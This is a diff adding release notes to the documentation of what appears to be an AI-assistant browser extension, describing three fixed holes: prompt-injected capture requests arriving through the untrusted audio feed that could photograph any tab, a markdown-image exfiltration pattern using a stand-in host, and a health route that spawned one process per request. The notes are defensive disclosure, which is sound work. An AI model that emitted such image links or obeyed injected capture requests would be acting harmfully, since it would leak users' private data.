@@ -37,6 +37,31 @@ the instant consent is given. Pinned both ways - refused while off, accepted onc
 
 (Full build only; the public build strips this surface entirely, verified in the built zip.)
 
+### Three holes in the local-only promise
+
+- **The assistant could photograph any tab it liked.** Snapshots have three callers with three different
+  amounts of trust, and they collapsed into two: the periodic sampler was carefully fenced to the meeting or
+  the shared tab, but an assistant-requested capture took the same path as the manual 📷 button and grabbed
+  whatever was on screen. Since the assistant reads a live untrusted audio feed, a prompt-injected request
+  could have photographed a password manager, a bank or an inbox and handed the image back. Agent requests
+  are fenced exactly like the sampler now, and a refusal is reported rather than looking like a capture that
+  did not happen.
+- **Remote images were an exfiltration channel.** Any advice or chat text containing `![](https://host/x?d=…)`
+  rendered as an `<img>` in a privileged extension page - a GET to an arbitrary host, no click needed, in a
+  product whose privacy policy says it makes no third-party requests. The CSP allowed `https:` wholesale.
+  Images may now come only from the local bridge or a `data:` URI, at both the CSP and the render sites, and
+  a blocked one says so instead of leaving a broken-image icon.
+- **`/health` spawned an ffmpeg per request.** The device-probe cache was written inside the callback and only
+  on success, so the common install - no BlackHole - missed it every time, on the one route that needs no
+  token. Measured: 30 concurrent requests, 30 processes. Concurrent probes collapse onto one in-flight promise
+  with a timeout, negative results are cached too, and a new suite holds it at exactly one - reverting the
+  collapse puts it straight back to 30.
+
+Also considered and **reverted**: removing the absolute data-dir path from the pre-auth `/health` response.
+The MCP adapter discovers its directory from that field and has no token until it does, so the change broke
+discovery to close a leak a web page cannot read anyway - CORS reflects an allow-origin header only for the
+extension. The reasoning is recorded in the code rather than the change being quietly retried later.
+
 ### It was never actually limited to Claude
 
 The bridge and the MCP adapter have nothing vendor-specific in them - plain JSON-RPC over stdio, no SDK, no
